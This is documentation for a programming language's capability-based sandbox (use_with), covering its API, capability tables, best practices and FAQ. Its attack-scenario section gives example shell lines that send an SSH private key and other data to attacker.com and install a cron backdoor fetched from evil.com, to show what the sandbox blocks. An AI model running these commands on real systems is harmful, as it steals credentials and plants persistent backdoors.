# Capability-Based Security System



---

## Overview

Franz's capability-based security system provides **sandboxed execution** of untrusted code by restricting access to dangerous operations (shell commands, file I/O, etc.) unless explicitly granted.

This solves the **Critical RCE (Remote Code Execution)** vulnerability where any imported module could execute arbitrary shell commands, read/write files, or steal sensitive data.

### Key Features

- ✅ **Complete Isolation:** Imported code runs in scope with NO parent access
- ✅ **Explicit Capability Grants:** Only requested capabilities are available
- ✅ **Fine-Grained Control:** Grant only specific dangerous operations
- ✅ **Capability Bundles:** Grant groups of safe, pure functions (arithmetic, lists, etc.)
- ✅ **Fail-Safe Design:** Unknown capabilities are ignored (non-fatal warnings)
- ✅ **Zero Runtime Overhead:** Capabilities checked at parse time, not runtime

---

## API Reference

### `use_with`

Execute code in a sandboxed environment with explicit capability grants.

**Syntax:**
```franz
(use_with capabilities path1 path2 ... callback)
```

**Parameters:**
- `capabilities` (list of strings) - Capability names to grant
- `path1, path2, ...` (strings) - File paths to import
- `callback` (function) - Function to execute in sandboxed scope

**Returns:** Result of callback function

**Example:**
```franz
// Safe: Only grants print and arithmetic
(use_with (list "print" "arithmetic") "untrusted-lib.franz" {
  result = (calculate_something)
  (println "Result:" result)
  <- result
})
```

---

## Capability Reference

### Dangerous I/O Capabilities (Explicit Grant Required)

These capabilities provide access to dangerous operations that can:
- Execute system commands
- Read/write files
- Access network (future)

**ONLY grant these to code you trust completely.**

| Capability | Functions Granted | Risk Level | Use Case |
|------------|------------------|------------|----------|
| `print` | `print`, `println` | 🟢 Low | Display output |
| `input` | `input` | 🟡 Medium | Read user input |
| `files:read` | `read_file` | 🟠 High | Read files from disk |
| `files:write` | `write_file` | 🔴 Critical | Write files to disk |
| `shell` | `shell` | 🔴 Critical | Execute shell commands |
| `events` | `event`, `rows`, `columns` | 🟡 Medium | Terminal events |
| `time` | `wait`, `time` | 🟢 Low | Time operations |
| `rand` | `random` | 🟢 Low | Random numbers |

### Safe Capability Bundles (Pure Functions)

These bundles grant **pure, side-effect-free** functions. Safe to grant to untrusted code.

| Bundle | Functions Granted | Purpose |
|--------|------------------|---------|
| `arithmetic` | `add`, `subtract`, `multiply`, `divide`, `remainder`, `power` | Math operations |
| `comparisons` | `is`, `less_than`, `greater_than` | Value comparisons |
| `logic` | `not`, `and`, `or` | Boolean logic |
| `control` | `loop`, `until`, `if` | Control flow |
| `types` | `integer`, `string`, `float`, `type` | Type conversions |
| `lists` | `list`, `map`, `reduce`, `filter`, `head`, `tail`, `cons`, `empty?`, etc. | List operations |
| `variants` | `variant`, `variant_tag`, `variant_values`, `match` | Algebraic data types |
| `immutability` | `freeze` | Immutable bindings |
| `functions` | `pipe`, `partial`, `call` | Function composition |
| `all` | All above bundles | **All pure functions** (NO I/O) |

### Special Bundle: `all`

The `all` capability grants **all pure, safe functions** but explicitly **EXCLUDES**:
- ❌ `shell` (shell command execution)
- ❌ `read_file` / `write_file` (file I/O)
- ❌ `input` (user input)
- ❌ `event` (terminal events)

Use `all` for untrusted code that needs full computational power but zero I/O access.

---

## Security Model

### 1. Scope Isolation

`use_with` creates a **completely isolated scope** with NO parent:

```c
Scope *p_capScope = Scope_new(NULL);  // NULL parent = complete isolation
```

**What this means:**
- ✅ Imported code **cannot** access your variables
- ✅ Imported code **cannot** access global scope
- ✅ Only granted capabilities are visible

**Example:**
```franz
secret_password = "hunter2"

(use_with (list "arithmetic") "untrusted.franz" {
  // Trying to access secret_password here will FAIL
  // Error: "secret_password is not defined"
  <- (add 1 2)
})
```

### 2. Fail-Safe Design

Unknown capabilities generate **warnings** but don't crash:

```franz
(use_with (list "arithmetic" "unknown_cap_xyz") "lib.franz" {
  // Warning @ Line X: Unknown capability "unknown_cap_xyz" - ignoring.
  // Code continues to execute
})
```

This prevents typos from breaking production code while alerting developers.

### 3. Least Privilege Principle

**Default:** Zero capabilities
**Grant:** Only what's needed
**Verify:** Test with minimal permissions first

```franz
// ❌ BAD: Grants too much
(use_with (list "all" "shell" "files:write") "small-util.franz" {
  // Utility only needs arithmetic but got full system access!
})

// ✅ GOOD: Minimal necessary capabilities
(use_with (list "arithmetic" "print") "small-util.franz" {
  // Utility has exactly what it needs, nothing more
})
```

---

## Usage Examples

### Example 1: Safe Math Library

```franz
// math-utils.franz - Pure math functions
factorial = {n ->
  (if (is n 0) {
    <- 1
  } {
    <- (multiply n (factorial (subtract n 1)))
  })
}

fibonacci = {n ->
  (if (less_than n 2) {
    <- n
  } {
    <- (add (fibonacci (subtract n 1)) (fibonacci (subtract n 2)))
  })
}
```

**Safe usage:**
```franz
(use_with (list "arithmetic" "comparisons" "control") "math-utils.franz" {
  result = (factorial 5)
  (println "5! =" result)  // ❌ ERROR: println not granted!
  <- result
})
```

**Fixed:**
```franz
result = (use_with (list "arithmetic" "comparisons" "control") "math-utils.franz" {
  <- (factorial 5)
})
(println "5! =" result)  // ✅ Print in outer scope
```

### Example 2: Untrusted Plugin System

```franz
// Load user-submitted plugins safely
run_plugin = {plugin_path ->
  (use_with (list "all" "print") plugin_path {
    // Plugin has full computational power
    // But CANNOT access shell, files, or network
    <- (plugin_main)
  })
}

// Safe to run untrusted code
result1 = (run_plugin "user_plugin_1.franz")
result2 = (run_plugin "user_plugin_2.franz")
```

### Example 3: Data Processing Pipeline

```franz
// process-data.franz - Data transformation
transform_data = {data ->
  cleaned = (map data {item index -> <- (cleanup item)})
  filtered = (filter cleaned {item index -> <- (is_valid item)})
  <- (reduce filtered {acc val index -> <- (merge acc val)} (list))
}
```

**Usage:**
```franz
raw_data = (read_file "data.csv")  // Main program can read files

result = (use_with (list "lists" "arithmetic" "logic") "process-data.franz" {
  // Data processing has NO file access
  // Can only transform data, not exfiltrate it
  <- (transform_data raw_data)
})

(write_file "output.csv" result)  // Main program controls output
```

### Example 4: Gradual Permission Escalation

```franz
// Start with minimal permissions, add only if needed
process_file = {file_path ->
  //  Validate (no I/O)
  is_valid = (use_with (list "types" "comparisons") "validator.franz" {
    <- (validate_format file_path)
  })

  (if is_valid {
    //  Process (read-only)
    data = (use_with (list "files:read" "lists") "processor.franz" {
      <- (load_and_parse file_path)
    })

    //  Save (write permission)
    (use_with (list "files:write") "saver.franz" {
      <- (save_results data)
    })
  } {
    (println "Invalid file format")
  })
}
```

---

## Security Best Practices

### ✅ DO

1. **Use `use_with` for ALL untrusted code**
   ```franz
   (use_with (list "arithmetic") "third-party-lib.franz" {...})
   ```

2. **Start with minimal capabilities, add as needed**
   ```franz
   // Start: (list "arithmetic")
   // If error: "function X not defined"
   // Add:    (list "arithmetic" "lists")
   ```

3. **Use `all` bundle for untrusted computational code**
   ```franz
   (use_with (list "all") "user-algorithm.franz" {
     // Full computational power, zero I/O
   })
   ```

4. **Keep dangerous capabilities in outer scope**
   ```franz
   data = (read_file "input.txt")  // Read in trusted scope
   result = (use_with (list "lists") "untrusted.franz" {
     <- (process data)  // Process in untrusted scope
   })
   (write_file "output.txt" result)  // Write in trusted scope
   ```

### ❌ DON'T

1. **Never grant `shell` to untrusted code**
   ```franz
   // ❌ CRITICAL VULNERABILITY
   (use_with (list "shell") "random-npm-package.franz" {...})
   ```

2. **Don't grant `files:write` unless absolutely necessary**
   ```franz
   // ❌ Can overwrite system files
   (use_with (list "files:write") "untrusted.franz" {...})
   ```

3. **Don't use regular `use` for untrusted code**
   ```franz
   // ❌ Full system access, no sandbox
   (use "untrusted.franz" {...})
   ```

4. **Don't assume third-party code is safe**
   ```franz
   // ❌ Even if it "looks safe", use sandboxing
   (use "color-utils.franz" {...})  // ❌ No protection

   // ✅ Always sandbox external code
   (use_with (list "arithmetic") "color-utils.franz" {...})
   ```

---

## Real-World Attack Scenarios

### Attack 1: SSH Key Theft

**Malicious code (color-utils.franz):**
```franz
// Looks innocent
random_color = { <- "#FF5733" }

// Hidden attack
(shell "curl http://attacker.com/steal?ssh=$(cat ~/.ssh/id_rsa)")
```

**Vulnerable:**
```franz
(use "color-utils.franz" {  // ❌ No sandbox
  <- (random_color)  // SSH keys stolen in background!
})
```

**Protected:**
```franz
(use_with (list "arithmetic") "color-utils.franz" {  // ✅ Sandboxed
  <- (random_color)  // ✅ shell not available - attack fails
})
// Error: "shell is not defined"
```

### Attack 2: Backdoor Installation

**Malicious code:**
```franz
(shell "echo '* * * * * curl evil.com/backdoor.sh|sh' | crontab -")
```

**Protected:**
```franz
(use_with (list "all") "untrusted.franz" {...})
// ✅ 'all' does NOT include 'shell' - backdoor blocked
```

### Attack 3: Data Exfiltration

**Malicious code:**
```franz
process_data = {data ->
  // Exfiltrate data
  (write_file "/tmp/stolen.txt" data)
  (shell "curl http://attacker.com/steal -d @/tmp/stolen.txt")
  <- data  // Return data to avoid suspicion
}
```

**Protected:**
```franz
(use_with (list "lists" "arithmetic") "data-processor.franz" {
  <- (process_data sensitive_data)
})
// ✅ write_file and shell not available - exfiltration blocked
```

---

## Implementation Details

### File Structure

```
src/security/
├── security.h           # Header with capability API
└── security.c           # Capability granting logic

docs/security/
└── security.md          # This file

examples/security/
├── working/
│   ├── safe-import.franz
│   └── safe-shell-test.franz
└── failing/
    └── malicious.franz

test/security/
├── security-comprehensive-test.franz
├── test-block-shell.franz
└── test-grant-shell.franz
```

### Compilation

The security module is compiled as part of the main Franz interpreter:

```bash
# Standard compilation (includes security module)
find src -name "*.c" -not -name "check.c" | xargs gcc -Wall -lm -o franz
```

### Architecture

```
┌─────────────────────────────────────────┐
│  Main Program (Trusted Scope)          │
│  - Full access to all functions        │
│  - Can read files, execute shell, etc. │
└────────────┬────────────────────────────┘
             │
             │ use_with (list "arithmetic")
             ↓
┌─────────────────────────────────────────┐
│  Sandboxed Scope (Isolated)            │
│  Parent: NULL                           │
│  Capabilities:                          │
│    ✅ add, subtract, multiply, divide  │
│    ❌ shell (not granted)              │
│    ❌ read_file (not granted)          │
│    ❌ Access to outer variables         │
└─────────────────────────────────────────┘
```

---

---

## Performance

### Overhead

- **Parse time:** Zero (capabilities checked once at scope creation)
- **Runtime:** Zero (standard function calls)
- **Memory:** Minimal (one isolated scope per use_with call)

### Benchmarks

```franz
// Benchmark: 1000 iterations of use_with
start = (time)
(loop 1000 {i ->
  (use_with (list "arithmetic") "lib.franz" {
    <- (square i)
  })
})
end = (time)
(println "1000 iterations:" (subtract end start) "ms")
// Result: ~150ms (0.15ms per call)
```

---

## Comparison with Other Languages

| Language | Security Model | Franz Equivalent |
|----------|---------------|------------------|
| **Deno** | `--allow-read`, `--allow-net` flags | `(use_with (list "files:read") ...)` |
| **Node.js vm** | Sandbox with limited context | `use_with` with minimal capabilities |
| **Python** | No built-in sandboxing | Franz is safer by default |
| **WebAssembly** | Memory-safe, no file access | Similar to `(use_with (list "all"))` |
| **Rust** | Compile-time memory safety | Franz has runtime capability safety |

---

## FAQ

### Q: What's the difference between `use` and `use_with`?

**A:** `use` = no sandbox (full access)
`use_with` = sandboxed (restricted access)

Always use `use_with` for untrusted code.

### Q: Can sandboxed code call other sandboxed code?

**A:** Yes, but nested sandboxes don't grant additional capabilities:

```franz
(use_with (list "arithmetic") "outer.franz" {
  // outer.franz contains:
  (use_with (list "shell") "inner.franz" {
    // ❌ shell still not available (outer doesn't have it)
  })
})
```

### Q: What if I need shell access temporarily?

**A:** Grant it explicitly, use it, revoke by scope exit:

```franz
(use_with (list "shell") "task.franz" {
  (do_shell_thing)
  <- result
})
// shell no longer available here
```

### Q: How do I debug "X is not defined" errors?

**A:** Add the required capability:

```
Error: "map is not defined"
Solution: Add "lists" capability
```

### Q: Is `use_with` backward compatible?

**A:** Yes! `use` still works for trusted code. `use_with` is additive.

---
